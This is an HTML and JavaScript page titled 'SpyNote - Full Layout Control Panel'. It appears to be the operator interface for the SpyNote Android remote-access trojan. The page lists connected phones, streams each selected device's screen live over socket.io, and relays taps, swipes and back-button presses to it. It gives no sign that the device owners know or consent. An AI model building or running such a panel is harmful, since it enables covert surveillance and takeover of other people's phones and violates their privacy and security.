<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote - Full Layout Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 1000;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .device { 
            padding: 15px; margin: 10px 0; background: #2a2a3a; 
            cursor: pointer; border-radius: 10px; transition: all 0.3s; 
            border: 2px solid transparent; position: relative;
        }
        .device:hover { background: #3a3a4a; transform: translateX(5px); border-color: #00ff88; }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
                  color: #000; border-color: #00ff88 !important; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.4; background: #1a1a1a; }
        .device-status { font-size: 12px; margin-top: 5px; }

        #phone-container {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 420px; height: 900px; z-index: 10;
        }
        #phone-frame {
            width: 100%; height: 100%; 
            background: #111; border: 30px solid #2a2a2a; 
            border-radius: 60px 60px 40px 40px; position: relative; 
            cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.7), inset 0 2px 10px rgba(255,255,255,0.1);
        }
        #phone-frame::before {
            content: ''; position: absolute; top: 15px; left: 50%;
            transform: translateX(-50%); width: 150px; height: 5px;
            background: #333; border-radius: 3px;
        }
        #screen { 
            width: 100%; height: 100%; 
            background: #000; border-radius: 25px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
        }

        #status-bar {
            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
            padding: 15px 20px; border-radius: 10px; font-size: 13px;
            backdrop-filter: blur(10px); border: 1px solid #333;
        }
        #controls {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 15px;
        }
        button {
            padding: 18px 35px; background: linear-gradient(45deg, #00d4ff, #0099cc); 
            color: white; border: none; border-radius: 30px; cursor: pointer; 
            font-size: 16px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(0,212,255,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,212,255,0.6); }
        button:active { transform: translateY(0); }
        #fps-counter { color: #00ff88; font-weight: bold; }

        .loading { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);
                    color: #00ff88; font-size: 18px; }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">üì± Connected Devices</h3>
        <div id="device-list">Scanning devices...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div id="fps-counter">FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div>Resolution: <span id="resolution">-</span></div>
    </div>

    <div id="phone-container">
        <div id="phone-frame">
            <canvas id="screen"></canvas>
            <div class="loading" id="loading-screen">Connecting to device...</div>
        </div>
    </div>

    <div id="controls">
        <button onclick="sendBack()" title="Send Back Button">üîô Back</button>
        <button onclick="toggleFullScreen()" title="Toggle Fullscreen">üì± Fullscreen</button>
        <button onclick="requestHighQuality()" title="Force High Quality">üñºÔ∏è HD Mode</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2340, deviceDensity = 420;
        let lastFrameTime = 0, frameCount = 0;
        let isHighQuality = true;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const resolutionDisplay = document.getElementById('resolution');
        const loadingScreen = document.getElementById('loading-screen');

        // Socket Connection
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ LIVE';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // üî• PERFECT FULL LAYOUT RENDERING
        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                deviceDensity = data.density || 420;
                
                resolutionDisplay.textContent = `${deviceWidth}x${deviceHeight}`;
                
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    // üî• PERFECT SHARP RENDERING FOR UI ELEMENTS
                    ctx.imageSmoothingEnabled = false;
                    ctx.imageSmoothingQuality = 'high';
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    loadingScreen.style.display = 'none';
                    
                    // FPS Calculation
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                
                img.onerror = () => {
                    console.error('Frame decode failed');
                    showError('Frame Error');
                };
                
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen render error:', e);
                showError('Render Error');
            }
        });

        function showError(msg) {
            loadingScreen.textContent = `‚ùå ${msg}`;
            loadingScreen.style.display = 'block';
            ctx.fillStyle = '#ff4444';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)"
                         title="${info.model || 'Unknown'}">
                        <b>${(info.model || id.slice(0,12)).replace('SM-', '')}</b><br>
                        <small>${info.brand || ''} Android ${info.version || '?'}</small>
                        <div class="device-status">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                            ${info.width ? `<br>${info.width}x${info.height}` : ''}
                        </div>
                    </div>
                `).join('') : '<div class="device disconnected">No devices found</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            
            socket.emit('select-device', { deviceId });
            loadingScreen.style.display = 'block';
            loadingScreen.textContent = 'Connecting to device...';
            console.log('üéØ Selected device:', deviceId);
        }

        // üî• PERFECT TOUCH/MOUSE COORDINATE SCALING
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // PERFECT TOUCH + MOUSE SUPPORT
        let startX = 0, startY = 0, isDragging = false;

        ['touchstart', 'mousedown'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                isDragging = true;
                const touch = e.touches?.[0] || e;
                const coords = getScaledCoords(touch.clientX, touch.clientY);
                startX = coords.x;
                startY = coords.y;
            }, { passive: false });
        });

        ['touchmove', 'mousemove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!isDragging || !currentDevice) return;
                e.preventDefault();
                const touch = e.touches?.[0] || e;
                const coords = getScaledCoords(touch.clientX, touch.clientY);
                
                // Send continuous swipe for smooth dragging
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'swipe',
                    startX, startY, endX: coords.x, endY: coords.y 
                });
            }, { passive: false });
        });

        ['touchend', 'mouseup'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!isDragging || !currentDevice) return;
                e.preventDefault();
                isDragging = false;
                
                // Final tap at end position
                const touch = e.changedTouches?.[0] || e;
                const coords = getScaledCoords(touch.clientX || startX, touch.clientY || startY);
                socket.emit('control', { 
                    deviceId: currentDevice, 
                    action: 'tap', 
                    x: coords.x, 
                    y: coords.y 
                });
            }, { passive: false });
        });

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        function requestHighQuality() {
            isHighQuality = !isHighQuality;
            socket.emit('quality-change', { deviceId: currentDevice, highQuality: isHighQuality });
        }

        // Initial devices fetch
        setTimeout(() => {
            fetch('/devices').then(r => r.json()).then(updateDeviceList);
        }, 1000);

        // Auto-reconnect devices
        setInterval(() => {
            fetch('/devices').then(r => r.json()).then(updateDeviceList);
        }, 5000);
    </script>
</body>
</html>
